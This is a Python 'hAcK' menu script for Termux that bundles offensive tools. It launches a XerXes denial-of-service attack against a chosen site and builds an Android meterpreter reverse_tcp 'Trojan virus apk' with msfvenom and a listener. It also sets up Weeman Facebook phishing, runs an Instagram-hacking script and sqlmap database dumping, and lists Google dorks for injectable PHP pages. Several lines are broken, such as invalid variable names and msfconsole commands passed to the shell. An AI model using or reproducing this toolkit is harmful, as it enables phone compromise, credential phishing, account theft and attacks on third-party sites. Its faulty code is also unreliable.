#!/usr/local/bin/python

from gettext import install
import os
import random
import time

nothing = "No function"
small = "qwertyuopasdfghjklizxcvbnm"
big = "QWERTYUOPIASDFGHJKLZXCVBNM"
number = "0123456789"
symbol = "+=/_!@#$%^&*()-':;,?`~|<>{}[]"
tool_id = number + small + big
hjdUv = '""chin"'
all = small + big + number + symbol
allS = small + big + number
length = 7
password = "".join(random.sample(all,length))
passwordS = "".join(random.sample(allS,length))
your_tool_id = "".join(random.sample(tool_id,5))
metasploit = "https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh"
pkg-install = "apt-get install"

def dorks_all() :
	print("""AVAIBLE DORKS :
index.php?id=
content.php?arti_id=
content.php?categoryId=
content.php?cID=
content.php?cid=
content.php?cont_title=
content.php?id
content.php?id=
content.php?ID=
content.php?p=
content.php?page=
content.php?PID=
content/conference_register.php?ID=
content/detail.php?id=
content/index.php?id=
content/pages/index.php?id_cat=
content/programme.php?ID=
content/view.php?id=
coppercop/theme.php?THEME_DIR=
corporate/newsreleases_more.php?id=
county-facts/diary/vcsgen.php?id=
cps/rde/xchg/tm/hs.xsl/liens_detail.html?lnkId=
cryolab/content.php?cid=
csc/news-details.php?cat=
customer/board.htm?mode=
customer/home.php?cat=
customerService.php?****ID1=
CuteNews" "2003..2005 CutePHP"
data filetype:mdb -site:gov -site:mil
db.php?path_local=
db/CART/product_details.php?product_id=
de/content.php?page_id=
deal_coupon.php?cat_id=
debate-detail.php?id=
declaration_more.php?decl_id=
default.php?*root*=
default.php?abre=
default.php?base_dir=
default.php?basepath=
default.php?body=
default.php?catID=
default.php?channel=
default.php?chapter=
default.php?choix=
default.php?cmd=
default.php?cont=
default.php?cPath=
default.php?destino=
default.php?e=
default.php?eval=
default.php?f=
default.php?goto=
default.php?header=
default.php?inc=
default.php?incl=
default.php?include=
default.php?index=
default.php?ir=
default.php?itemnav=
default.php?k=
default.php?ki=
default.php?l=
default.php?left=
default.php?load=
default.php?loader=
default.php?loc=
default.php?m=
default.php?menu=
default.php?menue=
default.php?mid=
default.php?mod=
default.php?module=
default.php?n=
default.php?name=
default.php?nivel=
default.php?oldal=
default.php?opcion=
default.php?option=
default.php?p=
default.php?pa=
default.php?pag=
default.php?page=
default.php?pageweb=
default.php?panel=
default.php?param=
default.php?play=
default.php?pr=
default.php?pre=
default.php?read=
default.php?ref=
default.php?rub=
default.php?secao=
default.php?secc=
default.php?seccion=
default.php?seite=
default.php?showpage=
default.php?sivu=
default.php?sp=
default.php?str=
default.php?strona=
default.php?t=
default.php?thispage=
default.php?TID=
default.php?tipo=
default.php?to=
default.php?type=
default.php?v=
default.php?var=
default.php?x=
default.php?y=
description.php?bookid=
designcenter/item.php?id=
detail.php?id=
detail.php?ID=
detail.php?item_id=
detail.php?prodid=
detail.php?prodID=
detail.php?siteid=
detailedbook.php?isbn=
details.php?BookID=
details.php?id=
details.php?Press_Release_ID=
details.php?prodId=
details.php?ProdID=
details.php?prodID=
details.php?Product_ID=
details.php?Service_ID=
directory/contenu.php?id_cat=
discussions/10/9/?CategoryID=
display_item.php?id=
display_page.php?id=
display.php?ID=
displayArticleB.php?id=
displayproducts.php
displayrange.php?rangeid=
docDetail.aspx?chnum=
down*.php?action=
down*.php?addr=
down*.php?channel=
down*.php?choix=
down*.php?cmd=
down*.php?corpo=
down*.php?disp=
down*.php?doshow=
down*.php?ev=
down*.php?filepath=
down*.php?goFile=
down*.php?home=
down*.php?in=
down*.php?inc=
down*.php?incl=
down*.php?include=
down*.php?ir=
down*.php?lang=
down*.php?left=
down*.php?nivel=
down*.php?oldal=
down*.php?open=
down*.php?OpenPage=
down*.php?pa=
down*.php?pag=
down*.php?pageweb=
down*.php?param=
down*.php?path=
down*.php?pg=
down*.php?phpbb_root_path=
down*.php?pollname=
down*.php?pr=
down*.php?pre=
down*.php?qry=
down*.php?r=
down*.php?read=
down*.php?s=
down*.php?second=
down*.php?section=
down*.php?seite=
down*.php?showpage=
down*.php?sp=
down*.php?strona=
down*.php?subject=
down*.php?t=
down*.php?texto=
down*.php?to=
down*.php?u=
down*.php?url=
down*.php?v=
down*.php?where=
down*.php?x=
down*.php?z=
download.php?id=
downloads_info.php?id=
downloads.php?id=
downloads/category.php?c=
downloads/shambler.php?id=
downloadTrial.php?intProdID=
Duclassified" -site:duware.com "DUware All Rights reserved"
duclassmate" -site:duware.com
Dudirectory" -site:duware.com
dudownload" -site:duware.com
DUpaypal" -site:duware.com
DWMail" password intitle:dwmail

FOR THE OTHERS OPEN https://www.termuxtech.com/2020/04/latest-google-dork-2020.html
	""")

def second(number) :
	say = int(number) * 33333
	for i in range(say):
		print(say)
	print("finished")

def are_logo() :
	print("""
           ____           _____,,          _______
         /___/\         |_| [] \\      / _______/|
       / __ \   \       '|_|___//     | _______| /
     / /__\   \  \    ''|_|| \_\\    '|  |  |____
   / /_____\  \  \   |_||   \_\\  '|  |_____/|
 /._/_/      \__\-/                  ''|  _____| /
                                              |  |  |______
                                              |  |______ /|
                                              |________|/
	""")

def termux_libs_down() :
	os.system(f"{pkg-install} git -y")
	os.system(f"{pkg-install} curl -y")
	os.system(f"{pkg-install} wget -y")
	os.system(f"{pkg-install} python -y")
	os.system(f"{pkg-install} python3 -y")
	os.system(f"{pkg-install} python2 -y")
	os.system(f"{pkg-install} php -y")
	os.system(f"{pkg-install} perl -y")
	os.system(f"{pkg-install} nano -y")
	os.system(f"{pkg-install} vim -y")
	os.system(f"{pkg-install} cat -y")
	os.system(f"{pkg-install} pip -y")
	os.system(f"{pkg-install} pip2 -y")
	os.system(f"{pkg-install} nmap -y")
	os.system(f"{pkg-install} hydra -y")
	os.system(f"{pkg-install} ruby -y")
	os.system("pip install wordlist -y")
	os.system("gem install bundle -y")
	os.system(f"{pkg-install} tsu -y")

def all_termux_libs_down() :
	os.system("cd")
	termux_libs_down()
	print("DOWNLOADING NGROK")
	os.system("sudo tar xvzf ~/Downloads/ngrok-stable-linux-amd64.tgz -C /usr/local/bin")
	print("NGROK DOWNLOADED")
	print("DOWNLOADING WEEMAN")
	os.system("git clone https://github.com/evait-security/weeman")
	print("WEEMAN DOWNLOADED")
	print("DOWNLOADING METASPLOIT")
	os.system(f"wget {metasploit}")
	print("METASPLOIT DOWNLOADED")
	print("PLEASE WAIT...")
	os.system("chmod +x metasploit.sh")
	print("METASPLOIT READY")
	print("Lazymux DOWNLOADING...")
	os.system("git clone https://github.com/Gameye98/Lazymux")
	print("Lazymux downloaded")
	print("Downloading Phoneinfoga")
	os.system("git clone https://github.com/sundowndev/PhoneInfoga")
	print("Phoneinfoga downloaded")
	print("Userrecon Downloading...")
	os.system("git clone https://github.com/thelinuxchoice/userrecon")
	os.system("clear")
	print("Download Complated")
	print("Open?")
	userrecon_ans = input("[y/n] ")
	if userrecon_ans == "y" or userrecon_ans == "Y" :
		os.system("chmod +x /data/data/com.termux/files/home/userrecon/userrecon.sh")
		os.system("bash /data/data/com.termux/files/home/userrecon/userrecon.sh")
	else :
		print("Userrecon downloaded")
	print("Ko-Dork Downloading...")
	os.system("git clone https://github.com/ciku370/ko-dork")
	print("Download complate")

def down_libs() :
		os.system("-m pip install --upgrade pip")
		os.system("pip install PyTelegramBotAPI")
		os.system("pip install telebot")
		os.system("pip install telegram")
		os.system("pip install random")
		os.system("pip install pillow")
		os.system("pip install requests")
		os.system("pip install pytube ")
		os.system("pip install aiogram ")
		os.system("python -m pip install --ugrade pip")
		os.system("python -m pip install python-telegram-bot")
		os.system("pip3 uninstall telebot -y")
		os.system("pip3 uninstall PyTelegramBotAPI -y")
		os.system("pip3 install PyTelegramBotAPI")
		os.system("pip3 install --upgrade pyTelegramBotAPI")
		os.system("clear")
		os.system("figlet complate")
		print("DOWNLOAD COMPLATED")
		print("SIZE ~ 300MB")

def show_libs() :
		print("""
		pip install PyTelegramBotAPI
		pip install telebot
		pip install telegram
		pip install random
		pip install pillow
		pip install requests
		python -m pip install --ugrade pip
		python -m pip install python-telegram-bot
		pip3 uninstall telebot (answer y)
		pip3 uninstall PyTelegramBotAPI (answer y)
		pip3 install PyTelegramBotAPI
		pip3 install --upgrade pyTelegramBotAPI
		""")
		Exit = input("hAcK --> Enter for close")
		os.system("clear")

def morze_alph() :
	print("Please use big characters")
	print("Example : .... . ._.. ._.. ___ --> HELLO")
	code = input("Morze code --> ")
	liste= list(code)
	liste1 = str(liste)
	liste2 = liste1.replace("[","")
	liste3 = liste2.replace("]","")
	liste4 = liste3.replace(",","")
	liste5 = liste4.replace("'","")
	print(liste5)
	liste6 = liste5.replace("A","._")
	liste7 = liste6.replace("B","_...")
	liste8 = liste7.replace("C","_._.")
	liste9 = liste8.replace("D","_..")
	liste10 = liste9.replace("E",".")
	liste11 = liste10.replace("F",".._.")
	liste12 = liste11.replace("G","__.")
	liste13 = liste12.replace("H","....")
	liste14 = liste13.replace("I","..")
	liste15 = liste14.replace("J",".___")
	liste16 = liste15.replace("K","_._")
	liste17 = liste16.replace("L","._..")
	liste18 = liste17.replace("M","__")
	liste19 = liste18.replace("N","_.")
	liste20 = liste19.replace("O","___")
	liste21 = liste20.replace("P",".__.")
	liste22 = liste21.replace("Q","__._")
	liste23 = liste22.replace("R","._.")
	liste24 = liste23.replace("S","...")
	liste25 = liste24.replace("T","_")
	liste26 = liste25.replace("U",".._")
	liste27 = liste26.replace("V","..._")
	liste28 = liste27.replace("W",".__")
	liste29 = liste28.replace("X","_.._")
	liste30 = liste29.replace("Y","_.__")
	liste31 = liste30.replace("Z","__..")
	liste32 = liste31.replace("1",".____")
	liste33 = liste32.replace("2","..___")
	liste34 = liste33.replace("3","...__")
	liste35 = liste34.replace("4","...._")
	liste36 = liste35.replace("5",".....")
	liste37 = liste36.replace("6","_....")
	liste38 = liste37.replace("7","__...")
	liste39 = liste38.replace("8","___..")
	liste40 = liste39.replace("9","____.")
	liste41 = liste40.replace("0","_____")
	liste42 = liste41.replace("?","..__..")
	liste43 = liste42.replace("!","_._.__")
	print(liste43)

def loading_screen(lought):
	percent = 0
	x = 0
	per_img = "|"
	while percent < 100 :
		perc = str(percent)
		pers = perc + "%"
		print(per_img + pers)
		percent = percent + 5
		per_img = per_img + "|"
		time.sleep(lought * 0.1)
	os.system("clear")
	print("""
\____\____\___/--\____/____/____/
 \_______\___|100%|___/_______/
   \____\___\_________/___/___/
	""")
	time.sleep(0.5)
	os.system("clear")
	print("Complated")
	time.sleep(0.1)

def startscreen_menu():
	os.system("figlet hAcK")
	print(" ")
	os.system("toilet -f mono12 -F gay tools")
	print(" ")
	print(f"""
[ID] {your_tool_id}

[1] Exit
[2] Telegram bot libraries
[3] Simple function
[4] Site information
[5] Root
[6] Site IP
[7] DOS attack
[8] Donwload Metasploit for Termux
[9] Your IP
[10] Trojan virus apk
[11] Current file location
[12] Check root
[13] Down. Termux libraries
[14] Change  "$" symbol
[15] Upgrade all Termux libraries
[16] Down. Weeman(facebook fishing)
[17] Start Weeman
[18] Down. all libraries with all tools
[19] Down. Ngrok
[20] Down Userrecon
[21] Down. PhoneInfoga(number operator and etc...)
[22] Down. Lazymux(many tools)
[23] Down. NMAP with Lazymux
[24] Scan site with NMAP
[25] Down. RedHawk with Lazymux
[26] start Ko Dork(search web site)
[27] start SQLmap(web hacking)
[28] Create Wordlist.txt
[29] Insta hack

	""")
	terminal = input("hAcK --> ")
	if terminal == "1" :
		print("Hi")
		print(stop)
	elif terminal == "2" :
		print("""
[1]See all libraries
[2]Download all libraries
[3]Exit
		""")
		lib_ans = input("hAcK --> ")
		if lib_ans == "1" :
			show_libs()
		elif lib_ans == "2" :
			down_libs()
		else :
			print(nothing)
	elif terminal == "3" :
		os.system("figlet Simple")
		print(" ")
		os.system("figlet functions")
		print(" ")
		print("""
[1] Create random password
[2] Write your name with big characters
[3] Word in morze alphabet
[4] Write your name big and colorful
		""")
		simple_funcs = input("hAcK --> ")
		s_funs = simple_funcs
		if s_funs == "1" :
			print(f"Password with symbol --> {password}")
			print(f"Password without symbol --> {passwordS}")
		elif s_funs == "2" :
			name_fig = input("Enter name --> ")
			os.system(f"figlet {name_fig}")
		elif s_funs == "3" :
			morze_alph()
		elif s_funs == "4" :
			rainBow_word_ans = input("Write your word :")
			os.system(f"toilet -f mono12 -F gay {rainBow_word_ans}")
	elif terminal == "4" :
		ter2 = input("Enter site's link --> ")
		os.system(f"whois {ter2}")
	elif terminal == "1" :
		print("Closing...")
		os.system("clear")
	elif terminal == "5" :
		os.system(f"{pkg-install} fakeroot")
		os.system("fakeroot")
		os.system("clear")
		print("Your phone is rooted for 1 time")
		print("try 'whoami' ")
		os.system("whoami")
	elif terminal == "6" :
  	  print("Enter site's link")
  	  site_ip = input("hAcK --> ")
  	  os.system(f"ping {site_ip}")
	elif terminal == "7" :
		os.system("clear")
		os.system("git clone https://github.com/CyberXCodder/XerXes.git")
		os.system("gcc xerxes.c -o xerxes")
		os.system("clear")
		print("Package download complate")
		print("AFTER")
		print("You must first agree with the rules. You are responsible for obtaining the IP address and everything else")
		print("write site's name")
		site_dos = input("hAcK --> ")
		os.system(f"./xerxes {site_dos} 80")
	elif terminal == "8" :
		os.system("clear")
		os.system(f"wget {metasploit}")
		os.system("chmod +x metasploit.sh")
		os.system(f"{pkg-install} vim")
		os.system("clear")
		os.system("Download complated")
	elif terminal == "9" :
		os.system("ifconfig")
		print("second IP is your in wifi IP")
	elif terminal == "10" :
		print("This virus apk only works if you and other device connect the same wifi")
		print("Enter for continue")
		continiue = input("hAcK --> Press Enter")
		os.system("cd /data/data/com.termux/files/home")
		os.system("cd /data/data/com.termux/files/home/metasploit-framework")
		os.system("bundle install")
		os.system("gem install nokogiri -v '1.12.5' --source 'https://rubygems.org/'")
		print("ENTER YOUR CURRENT IP")
		your_wifi_IP = input("hAcK --> ")
		print("ENTER YOUR APK'S NAME")
		your_apks_name = input("hAcK --> ")
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={your_wifi_IP} lport=4444 -o /sdcard/{your_apks_name}.apk")
		print("SECOND PART STARTING...")
		presS = input("Press Enter")
		os.system("cd metasploit-framework")
		os.system("msfconsole")
		os.system("use exploit/multi/handler")
		os.system("set payload android/meterpreter/reverse_tcp")
		os.system(f"set lhost {your_wifi_IP}")
		os.system("set lport 4444")
		os.system("exploit")
	elif terminal == "11" :
		os.system("pwd")
	elif terminal == "12" :
		os.system("whoami")
	elif terminal == "S2" :
		os.system("clear")
		passW = input("Enter password '")
		if passW != hjdUv and passW != your_tool_id :
			print("WRONG password")
		else :
			print("""
0101 1111 11 01 10 101 10
11 111
0111 1 10 110 0 11 1101 110 1011
			""")
	elif terminal == "13" :
		termux_libs_down()
	elif terminal == "14" :
		os.system("cd")
		os.system("cd /data/data/com.termux/files/usr/etc")
		os.system("nano /data/data/com.termux/files/usr/etc/bash.bashrc")
	elif terminal == "15" :
		os.system("pkg update -y")
		os.system("clear")
		os.system("pkg upgrade -y")
		os.system("clear")
		print("Complated")
	elif terminal == "16" :
		os.system("clear")
		os.system("git clone https://github.com/evait-security/weeman")
		os.system("cd /data/data/com.termux/files/home/weeman")
		os.system("python2 weeman.py")
	elif terminal == "17" :
		os.system("cd")
		os.system("cd /data/data/com.termux/files/home/weeman")
		os.system("python2 /data/data/com.termux/files/home/weeman/weeman.py")
	elif terminal == "18" :
		all_termux_libs_down()
		os.system("clear")
		print("""
Download complated
All size ~ 1,30QB
in packages :
	Weeman
	Metasploit
	Ngrok
	Lazymux
	Phoneinfoga
	Userrecon
	Ko-Dork
		""")
	elif terminal == "19" :
		os.system("clear")
		os.system(f"{pkg-install} tsu")
		os.system("sudo tar xvzf ~/Download/ngrok-stable-linux-amd64.tgz -C /usr/local/bin")
		print("COMPLATED")
	elif terminal == "20" :
		os.system("clear")
		os.system("git clone https://github.com/thelinuxchoice/userrecon")
		os.system("clear")
		print("Complated")
		print("Open?")
		userrecon_ans = input("[y/n] ")
		if userrecon_ans == "y" or userrecon_ans == "Y" :
			os.system("cd /data/data/com.termux/files/home/userrecon")
			os.system("chmod +x /data/data/com.termux/files/home/userrecon/userrecon.sh")
			os.system("bash /data/data/com.termux/files/home/userrecon/userrecon.sh")
		else :
			print("Ok.")
	elif terminal == "21" :
		os.system("clear")
		os.system("git clone https://github.com/sundowndev/PhoneInfoga")
		os.system("cd data/data/com.termux/files/home/PhoneInfoga")
		os.system("ls")
		os.system("clear")
	elif terminal == "22" :
		os.system("clear")
		os.system("git clone https://github.com/Gameye98/Lazymux")
		os.system("cd /data/data/com.termux/files/home/Lazymux")
		os.system("chmod 777 lazymux.py")
		os.system("clear")
		print("Start?")
		lazymux_ans = input("[y/n] ")
		if lazymux_ans == "y" or lazymux_ans == "Y" :
			os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
		else :
			print("Ok.")
	elif terminal == "23" :
		os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
		os.system("02")
		os.system("01")
		os.system("00")
		os.system("cd data/data/com.termux/files/home/")
		os.system("nmap --help")
	elif terminal == "24" :
		print("""
[1] Scan a site
[2] Scan site's security
		""")
		nmap_cevab_ans = input("hAcK --> ")
		if nmap_cevab_ans == "1" :
			os.system("clear")
			print("Type site's link or IP")
			nmap_site_link = input("hAcK -->")
			os.system(f"nmap {nmap_site_link}")
		elif nmap_cevab_ans == "2" :
			os.system("clear")
			print("Enter site's IP")
			nmap_site_ip = input("hAcK --> ")
			os.system(f"nmap -sV {nmap_site_ip}")
	elif terminal == "ID" :
		are_logo()
	elif terminal == "25" :
		os.system("clear")
		os.system(f"{pkg-install} php")
		os.system("clear")	
		os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
		os.system("02")
		os.system("05")
	elif terminal == "26" :
		os.system("clear")
		os.system("git clone https://github.com/ciku370/ko-dork")
		os.system("chmod +x /data/data/com.termux/files/home/ko-dork/dork.py")
		dorks_all()
		os.system("python2 /data/data/com.termux/files/home/ko-dork/dork.py")
	elif terminal == "27" :
		print("Do you have SQLMAP?")
		sqlmap_ans = input("[y/n]")
		if sqlmap_ans == "y" or sqlmap_ans == "Y" :
			print("""
--> python2 sqlmap.py -u {link} --dbs
                                                       -D {dbs_name} --tables
                                                       
			""")
			sitelinkforsql = input("")
			os.system("cd /data/data/com.termux/files/home/sqlmap")
			os.system("python2 /data/data/com.termux/files/home/sqlmap/sqlmap.py -u {sitelinkforsql} --dbs")
		else :
			print("Lazymux>02>09")
	elif terminal == "28" :
		os.system("clear")
		os.system("pip install wordlist")
		print("Do you have 3,0QB free space?")
		wordlist_ans = input("[y/n]")
		if wordlist_ans == "y" or wordlist_ans == "Y" :
			print("Enter wordlist's name : ")
			wordlistname = input("hAcK --> ")
			os.system("clear")
			print("Please wait...")
			os.system("cd /sdcard")
			print("Download finished after an hour")
			print(f"Downloading {wordlistname}.txt")
			os.system(f"wordlist -m 7 -M 15 -o /sdcard/{wordlistname}.txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
		else :
			print("Download cancelled.")
	elif terminal == "29" :
		os.system("git clone https://github.com/fuck3erboy/instahack")
		os.system("chmod +x /data/data/com.termux/files/home/instahack/hackinsta.py")
		os.system("python /data/data/com.termux/files/home/instahack/hackinsta.py")
	else :
		print("No function")
		os.system("clear")
		return startscreen_menu()
	again = input("hAcK--> Close window")
	os.system("clear")
	return startscreen_menu()

os.system("clear")
os.system(f"{pkg-install} figlet -y")
os.system(f"{pkg-install} toilet -y")
os.system("clear")
loading_screen(2)
startscreen_menu()

#Finish
#Made by T0F1Q